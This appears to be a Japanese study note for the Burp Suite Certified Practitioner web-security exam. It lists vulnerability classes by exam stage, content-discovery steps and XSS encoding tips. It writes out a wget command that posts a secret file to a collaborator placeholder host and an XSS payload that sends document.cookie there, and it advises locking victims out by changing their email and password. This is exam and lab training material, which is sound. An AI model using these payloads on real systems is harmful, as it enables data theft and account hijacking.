##### Tip

- stageごとの悪用を。Stageを跨いで悪用しても時間の無駄
- 1つのアプリに集中する
- stage2に到達した時点でuser interactionnを使用していなかったら、stage2ではuser interactionを使用する
- エラーを見る
- スクリプトはVSCode上で編集する
- アクセス時、ログイン時、privesc完了時にそれぞれ機能の探索をする。見慣れない機能には脆弱性が隠れている可能性が高いが、==そうでないこともある==ので注意
- 被害者は15秒ごとにhomepageやDeliverされたものを訪れる
- ⭐️「詳細なCheatsheet」と「簡潔なCheatsheet」に同じタイプの脆弱性が載っているか確認すること！！
	- 脆弱性の名前で検索し、見た目で判断する
	- 簡潔なCheatsheetで見つからなければ詳細なCheatsheetをみる

##### 🚨

- Param Minerは永遠に終わらない！リクエストキャプチャ時にParam Minerのリクエストをキャプチャしてしまう。初回はこれで落ちた
- CSRFトークンを使用する重要な処理(パスワードアップデート等)はLive taskをOFFにしScannerもかけない。
	- Invalid CSRF tokenやInvalid requestを腐るほど見た

- ⭐️アカウントを侵害したら、すぐにアクセスできるように整えること。＝足場を固める
	- CarlosのCookie入手して、しばらくしてCookieが代わり、また再度攻撃して入手する必要があった。
	- Update emailなどで被害者のemailを自身のものに変更し、任意のパスワードに変更して、万が一ログアウトしてもすぐログインしなおせるようにすること

- ScannerのLoggerをみて、ログイン状態で実行できているか確認すること

🚨 ↓複数のStageで考えられうる脆弱性もあることを意識する🚨
![[Pasted image 20240214205513.png | 280]]

---
## Stage1: Access any user account


- [[#Content discovery]]
- [[🔍XSS]]
- [[🔍DOM-based Vuln]]
- [[🔍Web cache poisoning]]
- [[🔍HTTP Host header attack]]
- [[🔍HTTP request smuggling]]
- [[🔍Authentication]] - 💡Carlosとは限らない
- [[⚡️Race condition#Stage1]]

---
## Stage2: PrivEsc / `administrator`アカウント漏洩

- [[🔍CSRF]]
- [[⚡️Password reset]]
- [[🔍SQLi - Automated]]
- [[🔍NoSQLi]]
- [[⚡️JWT]]
- [[🔍OAuth]]
- [[⚡️Prototype Pollution]]
- [[🔍Access control]]
- [[🔍GraphQL API vuln]]
- [[🔍 Insecure deserialization]] - データ型操作によるアカウント窃取のみ
- [[⚡️Race condition#Stage2]]
- [[🔍API testing]] - 優先度低め。APIエンドポイント検出時に検討 or 手詰まりの時にSSPPを検討
- CORS([[4. CORS設定の不備による脆弱性とその悪用]]) - ほぼあり得ない

---
## Stage3: RCE / ローカルファイル窃取(`/home/carlos/secret`)

- [[⚡️Prototype Pollution]] - Server-side 
- [[🔍XXEi]]
- [[🔍SSRF]]
- [[🔍SSTI]]
- [[🔍Path traversal]]
- [[⚡️File upload vuln]]
- [[🔍 Insecure deserialization]]
- [[🔍Command Injection]]

💡secret窃取用OSコマンド
```zsh
wget https://COLLABORATOR_DOMAIN --post-file=/home/carlos/secret
```

---
#### Misc

- ⭐️[[Web攻撃の難読化]]
- [[⚡️Business logic vuln]]: 重要な考え方のようなもの
- Web LLM - 1/30に登場なので試験に出ない可能性大。もしAIとのchat機能があるなら[[1. Web LLM attackの基本と対策]]
-  [[Clickjacking]]: 優先度はかなり低い

---
## Content discovery

###### 1. Engagement Toolsの[[Burp Suite Professional Editionの機能#Discover content]]を実行する

- wordlistは以下にある
```
/Users/ikedakoshiro/forBurpSuite/burp_wordlists/for_content_discover.txt
```
- Configは以下の通りに設定する
![[Pasted image 20240209162633.png | 400]]

###### 2. 隠されたエンドポイントの検出

- `GET /`に対して、[[🔍Information disclosure ・ Access control ・ GraphQL]]のwordlistで興味深いエンドポイントをbrute-force

if
- `/.git`エンドポイント: [[3. 一般的な情報開示ソース#バージョン管理履歴]]でパスワードを抽出
- `/admin`エンドポイントに`TRACE`メソッドが使用可能-> [Github: cheatsheet: Trace to Admin](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study/tree/main?tab=readme-ov-file#trace-to-admin)
- Error: `Query not present` -> [[🔍GraphQL API vuln]]

###### 3. Param Miner -> Guess Headers

- `GET /`に対して走らせる
- [[🔍HTTP Host header attack]]や[[🔍Web cache poisoning]]に使用可能なヘッダが検出できるかも
	- Guess everythingは非推奨。時間が10分程かかる
	- Param Minerを停止させるときはUnload × loadを複数回繰り返す(うまく動作しなくなることがある)
###### 4. 一通りアプリを探索した後、Engagement ToolsのFind commentsを実行する& Targetで興味深いページがないか確認

- デバッグ用エンドポイントなど有益な情報がないか探す
- Information disclosureやInsecure deserializationにつながる可能性

---
## 手詰まりになったら...

### ⭐️URLエンコードについて

XSSで躓きやすい。
- 💡まずは何もエンコードせず実行してみること。
- 次に、検索バーなどエントリポイントに入力してみること。サーバ側でよしなに整えてくれることが多い

それでも...
- ペイロードは正しいはずなのに、うまく実行されないことがある
	- 原因は必要ない文字までUrlエンコードしてしまっているせいで、サーバ側でデコードした後、有効なペイロードではなくなっているから。

- 💡ペイロードはHackVertorで`urlencode` & URL部分はエンコードしない！
```js
<@urlencode>"}; document.location="<@/urlencode>https://COLLABORATOR_DOMAIN/?<@urlencode>"+document.cookie; //<@/urlencode>
```

- もしくは[簡潔なcheatsheet](https://github.com/DingyShark/BurpSuiteCertifiedPractitioner#xss)で"URL Encoded:"を検索する


- 例: `https://example.com/?c=" document.cookie`
↓HVでurlencode_not_plusとしてしまった場合：失敗
```
https%3A%2F%2Fexample.com%2F%3Fc%3D%22%20document.cookie
```

URLとして使用されている文字以外をurlencode_not_plusとした場合:成功
```
https://example.com/?c=%22%20document.cookie
```


↓ちなみにURL上の特殊文字として解釈されるものたち
```
! * ' " ( ) ; : @ & = + $ , / ? % # [ ]
```

###### Recon

- Do Active Scannをindexページやsvgなどの静的ファイルにかけてみる。
- sourceから`<script>`タグを探してみる
- resourceなどの静的ファイルに特殊なものはないか？
- Issueでseverityがmediumのものを無視していないか？

###### Exploit

- 権限ごとのCookieを使用する必要はないか？：ブラウザのプライベートモードでログインすることで新たにcookieを発行できる